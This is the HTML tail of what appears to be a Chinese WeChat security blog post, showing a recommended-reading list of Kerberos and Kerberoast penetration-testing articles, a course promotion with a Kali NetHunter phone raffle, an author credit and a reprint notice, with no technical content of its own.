rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)">推荐阅读：</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"><br  /></strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497760&amp;idx=1&amp;sn=4c0f57ba9203cc115a85cd0c011fdc43&amp;chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | Kerberos 协议与 Kerberos 认证原理</a><br  /></strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><br  /></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><strong><span style="color: rgb(0, 0, 0);"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497830&amp;idx=1&amp;sn=9dfacfb1a9513c860a3aeb268770097e&amp;chksm=ec1cad59db6b244f05d44dc179ee9969acea9b0371c653992d9a65a80ae235cfa812186316db&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">内网渗透 | Kerberos 协议相关安全问题分析与利用</a><br  /></span></strong></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497831&amp;idx=1&amp;sn=cdc3aef06751705f8156f35115f6892d&amp;chksm=ec1cad58db6b244e5174b026c9699cf70066ac919ee2213c69742e74bd990be224feee996c03&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>内网渗透 | SPN 与 Kerberoast 攻击讲解</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">本月报名可以参加抽奖送Kali NetHunter手机的优惠活动</span><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497897&amp;idx=1&amp;sn=5801b91d451b4c253eb3e2c5ff220673&amp;chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;inset: auto;"><img class="rich_pages" data-galleryid="" data-ratio="0.4269788182831661" data-s="300,640" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/77_ZtzN9KGsEWibPgYw55Lkm5VuKthibQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="897" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 36px;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;height: auto !important;"  /></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__5" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__6" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__7" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font-size:12px;line-height:32px;;">原创投稿作者：11ccaab</span><span style="color: rgba(0, 0, 0, 0.3);letter-spacing: 0.544px;text-align: start;font-size:12px;line-height:32px;;"></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font-size:12px;line-height:32px;;">未经授权，禁止转载</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-galleryid="" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/78_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;height: auto !important;"  /></p>
                </div>
</div>
</body>
</html>